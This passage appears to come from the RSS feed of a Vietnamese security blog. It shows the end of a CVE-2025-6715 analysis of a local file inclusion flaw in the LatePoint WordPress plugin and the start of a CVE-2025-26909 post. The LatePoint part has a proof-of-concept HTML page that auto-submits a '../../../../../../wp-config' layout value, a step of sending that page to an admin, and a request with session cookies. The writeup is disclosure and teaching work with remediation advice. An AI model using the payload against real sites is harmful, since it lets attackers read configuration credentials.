1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;render()&lt;/code&gt; được gọi tại &lt;strong&gt;12 vị trí khác nhau&lt;/strong&gt;, nên việc &lt;strong&gt;trace thủ công&lt;/strong&gt; sẽ rất mất thời gian.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/ref.png&#34;&#xA;    alt=&#34;12 vị trí gọi hàm render()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;12 vị trí gọi hàm &lt;code&gt;render()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Để tối ưu, ta sử dụng &lt;strong&gt;debugger&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đặt &lt;strong&gt;breakpoint&lt;/strong&gt; trong hàm &lt;code&gt;render()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thực hiện lần lượt các thao tác trong giao diện (UI).&lt;/li&gt;&#xA;&lt;li&gt;Mỗi khi &lt;code&gt;render()&lt;/code&gt; được gọi, chương trình sẽ &lt;strong&gt;tạm dừng tại breakpoint&lt;/strong&gt; và &lt;strong&gt;highlight&lt;/strong&gt; dòng code tương ứng, giúp xác định nhanh luồng gọi hàm.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/scr.gif&#34;&#xA;    alt=&#34;Video debugger nhảy đến break point&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Video debugger nhảy đến break point&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Khi truy cập endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt; với route name là các submenu của plugin thì &lt;code&gt;render()&lt;/code&gt; được gọi với layout mặc định là &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/default_layout.png&#34;&#xA;    alt=&#34;Layout mặc định&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Layout mặc định&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Quan sát callstack, ta thấy được luồng gọi hàm đến &lt;code&gt;render()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/callstack.png&#34;&#xA;    alt=&#34;Luồng gọi hàm trong callstack&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Luồng gọi hàm trong callstack&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){&#xA;  $html = &amp;#39;&amp;#39;;&#xA;  if($this-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;json_view_name&amp;#39;];&#xA;    $response_html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), &amp;#39;none&amp;#39;, $extra_vars);&#xA;    $this-&amp;gt;send_json(array_merge(array(&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_SUCCESS, &amp;#39;message&amp;#39; =&amp;gt; $response_html), $json_return_vars));&#xA;  }else{&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;html_view_name&amp;#39;];&#xA;    $this-&amp;gt;extra_css_classes[] = $this-&amp;gt;generate_css_class($view_name);&#xA;    $this-&amp;gt;vars[&amp;#39;extra_css_classes&amp;#39;] = $this-&amp;gt;extra_css_classes;&#xA;    $html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), $this-&amp;gt;get_layout(), $extra_vars);&#xA;  }&#xA;  return $html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render()&lt;/code&gt; được &lt;code&gt;format_render_return()&lt;/code&gt; gọi khi &lt;code&gt;get_return_format()&lt;/code&gt; không phải là &lt;code&gt;json&lt;/code&gt;, mặc định nó là &lt;code&gt;html&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$return_format = &amp;#39;html&amp;#39;&#xA;...&#xA;function get_return_format(){&#xA;  return $this-&amp;gt;return_format;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;layout&lt;/code&gt; mà ta cần quan tâm là giá trị trả về của &lt;code&gt;get_layout()&lt;/code&gt; =&amp;gt; có &lt;code&gt;get_layout()&lt;/code&gt; thì cũng sẽ có &lt;code&gt;set_layout()&lt;/code&gt;, ta tìm với từ khóa &lt;code&gt;set_layout&lt;/code&gt; trong cùng file để xem giá trị &lt;code&gt;layout&lt;/code&gt; được set như nào.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$layout = &amp;#39;admin&amp;#39;&#xA;...&#xA;function set_layout($layout = &amp;#39;admin&amp;#39;){&#xA;  if(isset($this-&amp;gt;params[&amp;#39;layout&amp;#39;])){&#xA;    $this-&amp;gt;layout = $this-&amp;gt;params[&amp;#39;layout&amp;#39;];&#xA;  }else{&#xA;    $this-&amp;gt;layout = $layout;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biến &lt;code&gt;$layout&lt;/code&gt; được gán giá trị mặc định là &lt;strong&gt;&lt;code&gt;&#39;admin&#39;&lt;/code&gt;&lt;/strong&gt;, tương ứng với layout mà ta đã phân tích trước đó.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;set_layout()&lt;/code&gt; có nhiệm vụ xác định layout sẽ sử dụng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu trong &lt;code&gt;$this-&amp;gt;params&lt;/code&gt; có tồn tại tham số &lt;code&gt;layout&lt;/code&gt;, thì hàm sẽ dùng giá trị đó.&lt;/li&gt;&#xA;&lt;li&gt;Ngược lại, nếu không có, nó sẽ gán layout mặc định (&lt;code&gt;&#39;admin&#39;&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta tiếp tục tận dụng sức mạnh của &lt;strong&gt;debugger&lt;/strong&gt;, quan sát biến &lt;code&gt;$params&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/params.png&#34;&#xA;    alt=&#34;Giá trị của $params&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Giá trị của &lt;code&gt;$params&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; bao gồm 2 key là &lt;code&gt;page&lt;/code&gt; và &lt;code&gt;route_name&lt;/code&gt; tương đương với params string khi ta truy cập endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Như vậy &lt;code&gt;layout&lt;/code&gt; cũng là param được truyền trong URL, ta tận dụng điều này để khai thác.&lt;/p&gt;&#xA;&lt;p&gt;Thử truy cập endpoint trên với &lt;code&gt;layout&lt;/code&gt; param&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&amp;amp;layout=payload HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=latepoint&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$layout&lt;/code&gt; đã được ta hoàn toàn kiểm soát&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/layout.png&#34;&#xA;    alt=&#34;$layout được kiểm soát&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;&lt;code&gt;$layout&lt;/code&gt; được kiểm soát&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo trang web có form, tự động gửi request với LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;latepoint&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;route_name&amp;#34; value=&amp;#34;calendars__view&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;layout&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Gửi link đến trang web cho admin hoặc người dùng có đặc quyền&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Vì đây là CVE được công bố &lt;strong&gt;Unauthenticated&lt;/strong&gt;, nên ta tận dụng plugin không check &lt;code&gt;nonce&lt;/code&gt; để người dùng đã đăng nhập truy cập vào link trang web độc hại rồi tự gửi request đến trang WordPress đó kèm theo cookie.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 5.1.93&lt;/strong&gt; của LatePoint cho phép &lt;strong&gt;LFI&lt;/strong&gt; vì tham số &lt;code&gt;layout&lt;/code&gt; không được xác thực trước khi &lt;code&gt;include()&lt;/code&gt;, dẫn tới khả năng &lt;strong&gt;đọc tệp cục bộ&lt;/strong&gt; (ví dụ &lt;code&gt;wp-config.php&lt;/code&gt;). Lỗ hổng được vá trong &lt;strong&gt;5.1.94&lt;/strong&gt; bằng cách lọc ký tự, dùng &lt;code&gt;realpath()&lt;/code&gt; và giới hạn thư mục hợp lệ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Đây là &lt;strong&gt;LFI (đọc file)&lt;/strong&gt; — không có bằng chứng RCE trong PoC.&lt;/li&gt;&#xA;&lt;li&gt;Tham số điều khiển đường dẫn phải được &lt;strong&gt;sanitize + canonicalize&lt;/strong&gt; trước khi dùng.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;realpath()&lt;/strong&gt; và &lt;strong&gt;kiểm tra base dir&lt;/strong&gt; để ngăn traversal.&lt;/li&gt;&#xA;&lt;li&gt;Không &lt;strong&gt;include&lt;/strong&gt; trực tiếp dữ liệu từ request; xây hàm an toàn như &lt;code&gt;get_safe_layout_path()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-94-unauthenticated-lfi-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress LatePoint Plugin &amp;lt;= 5.1.93 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26909 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/</link>
      <pubDate>Sat, 18 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 5.4.01&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26909&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26909&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.4.01&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.4.02&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hide-my-wp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hide My WP Ghost Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 